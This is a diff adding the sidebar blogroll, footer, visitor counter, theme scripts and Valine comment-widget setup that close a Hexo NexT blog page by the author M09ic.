+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://yml-sec.top/" title="https:&#x2F;&#x2F;yml-sec.top" rel="noopener" target="_blank">夜莫离</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nightrainy.github.io/" title="https:&#x2F;&#x2F;nightrainy.github.io" rel="noopener" target="_blank">知世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.360bug.net/" title="http:&#x2F;&#x2F;www.360bug.net" rel="noopener" target="_blank">孙德胜</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-paper-plane"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M09ic</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'yP9ifyVVnh7znqRQVWNWn0V6-gzGzoHsz',
+      appKey     : 'k84kdIIIEt3b7F17XqEoBT22',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
